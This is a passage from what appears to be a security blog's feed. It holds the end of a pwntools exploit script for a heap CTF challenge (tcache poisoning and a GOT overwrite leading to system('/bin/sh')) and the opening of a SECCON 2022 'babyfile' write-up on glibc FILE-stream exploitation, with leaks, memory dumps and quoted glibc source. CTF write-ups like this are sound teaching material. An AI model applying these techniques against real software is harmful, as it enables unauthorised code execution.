    <span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1">#== tcache poisoning</span>
 
    <span class="c1"># get the 0x20 sized chunk that is right after the oob chunk</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="c1"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 

    <span class="c1"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x21f0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">realloc</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)))</span> 

    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span> <span class="c1"># useless</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

    <span class="c1"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">scanf</span><span class="p">))</span>


    <span class="c1"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/pwnme" term="pwnme" label="pwnme" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/tcache" term="tcache" label="tcache" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[SECCON CTF 2022 Quals] babyfile]]></title>
            <link href="https://nasm.re/posts/babyfile/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/babyfile/</id>
            
            <published>2022-08-19T00:00:00+00:00</published>
            <updated>2022-08-19T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>babyfile is a file stream exploitation I did during the <a
  class="gblog-markdown__link"
  href="https://ctftime.org/event/1764"
  
  >SECCON CTF 2022 Quals</a
> event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on <code>_IO_obstack_jumps</code>! The related files can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile"
  
  >here</a
>. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially <a
  class="gblog-markdown__link"
  href="../catastrophe"
  
  >this one</a
> and <a
  class="gblog-markdown__link"
  href="../filestream"
  
  >this other one</a
>.</p>



  <div class="gblog-toc gblog-toc__level--5">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a>
      <ul>
        <li><a href="#tldr">TL;DR</a></li>
      </ul>
    </li>
    <li><a href="#what-we-have">What we have</a></li>
    <li><a href="#exploitation-ideas">Exploitation ideas</a>
      <ul>
        <li><a href="#libc-leak">Libc leak</a></li>
        <li><a href="#heap-leak">Heap leak</a></li>
        <li><a href="#obstack-exploitation">obstack exploitation</a></li>
      </ul>
    </li>
    <li><a href="#profit">PROFIT</a></li>
    <li><a href="#annexes">Annexes</a></li>
  </ul>
</nav>
    <hr />
  </div>


<div class="gblog-post__anchorwrap">
    <h2 id="tldr">
        TL;DR
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Populate base buffer with heap addresses with the help of <code>_IO_file_doallocate</code>.</li>
<li>Make both input and output buffer equal to the base buffer with the help of <code>_IO_file_underflow</code>.</li>
<li>Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.</li>
<li>Leak a heap address by printing a pointer stored within the main_arena.</li>
<li><code>_IO_obstack_overflow</code> ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>The challenge is basically opening <code>/dev/null</code>, asking for an offset and a value to write at <code>fp + offset</code>. And we can freely flush <code>fp</code>. The source code is prodided:</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="577707ec-1">
    <span>Source code</span>
    <span>...</span>
  </label>
  <input id="577707ec-1" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <p>Source code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">getnline</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="cp">#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>

	<span class="n">alarm</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>

	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Play with FILE structure</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">))){</span>
		<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Open error&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="k">for</span><span class="p">(;;){</span>
		<span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">()){</span>
			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
				<span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
				<span class="n">fflush</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
				<span class="p">{</span>
					<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ofs</span><span class="p">;</span>
					<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;offset: &#34;</span><span class="p">);</span>
					<span class="k">if</span><span class="p">((</span><span class="n">ofs</span> <span class="o">=</span> <span class="n">getint</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">)</span>
						<span class="n">ofs</span> <span class="o">|=</span> <span class="mh">0x40</span><span class="p">;</span>
					<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;value: &#34;</span><span class="p">);</span>
					<span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fp</span><span class="p">)[</span><span class="n">ofs</span><span class="p">]</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
				<span class="p">}</span>
				<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Done.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="p">}</span>

<span class="nl">END</span><span class="p">:</span>
	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Bye!&#34;</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">MENU</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;1. Flush</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;2. Trick</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;0. Exit</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;&gt; &#34;</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">getint</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">getnline</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">){</span>
	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
		<span class="n">len</span><span class="o">--</span><span class="p">;</span>
	<span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>

	<span class="n">getnline</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
	<span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
  </div>
</div>

<div class="gblog-post__anchorwrap">
    <h1 id="exploitation-ideas">
        Exploitation ideas
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#exploitation-ideas" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation ideas" href="#exploitation-ideas">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>I tried (in this order) to:</p>
<ul>
<li>Get a libc leak by calling <code>_IO_file_underflow</code> to make input and output buffers equal to the base buffer that contains with the help of <code>_IO_file_doallocate</code> a heap address. And then flushing the file stream to leak the libc. <span class="emoji">✅</span>
</li>
<li>Get a heap leak by leaking a heap pointer stored within the <code>main_arena</code>. <span class="emoji">✅</span>
</li>
<li>Get an arbitrary write with a tcache dup technique, I got <code>__free_hook</code> as the last pointer available in the target tcache bin but I didn&rsquo;t succeeded to get a shell &gt;.&lt;. <span class="emoji">❌</span>
</li>
<li>Call primitive with control over the first argument by calling <code>_IO_obstack_overflow</code> (part of the <code>_IO_obstack_jumps</code> vtable). Then it allows us to call <code>system(&quot;/bin/sh\x00&quot;)</code>. <span class="emoji">✅</span>
</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="libc-leak">
        Libc leak
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#libc-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Libc leak" href="#libc-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we&rsquo;re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p>
<p>The initial state of the file stream looks like this:</p>
<pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
0x559c0955e2d0: 0x0000000000000000      0x0000000000000000
0x559c0955e2e0: 0x0000000000000000      0x0000000000000000
0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
</code></pre><p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="dd3f063e-6">
    <span>_IO_default_doallocate</span>
    <span>...</span>
  </label>
  <input id="dd3f063e-6" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_default_doallocate</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">BUFSIZ</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buf</span><span class="o">+</span><span class="n">BUFSIZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
  </div>
</div>
</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="44ea7947-7">
    <span>fp state after the _IO_default_doallocate</span>
    <span>...</span>
  </label>
  <input id="44ea7947-7" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480
0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000
0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
</code></pre>
  </div>
</div>

<p>Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.
Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flags</code> is <code>0xfbad1800 | 0x8000</code> (plus <code>0x8000</code> =&gt; <code>_IO_USER_LOCK</code> to not stuck into <code>fflush</code>), we do not have issues with the checks. The issue with the <code>_IO_SYSREAD</code> call is described in the code below.

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="5a49cc25-8">
    <span>_IO_new_file_underflow</span>
    <span>...</span>
  </label>
  <input id="5a49cc25-8" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">ssize_t</span> <span class="n">count</span><span class="p">;</span>

  <span class="cm">/* C99 requires EOF to be &#34;sticky&#34;.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* We used to flush all line-buffered stream.  This really isn&#39;t
</span><span class="cm">	 required by any standard.  My recollection is that
</span><span class="cm">	 traditional Unix systems did this for stdout.  stderr better
</span><span class="cm">	 not be line buffered.  So we do just that here
</span><span class="cm">	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="cm">/* This is very tricky. We have to adjust those
</span><span class="cm">     pointers before we call _IO_SYSREAD () since
</span><span class="cm">     we may longjump () out while waiting for
</span><span class="cm">     input. Those pointers may be screwed up. H.J. */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="cm">/* Given the vtable is misaligned, _IO_SYSREAD will call 
</span><span class="cm">  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>


  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
</span><span class="cm">	 handles.  As a result, our offset cache would no longer be valid, so
</span><span class="cm">	 unset it.  */</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
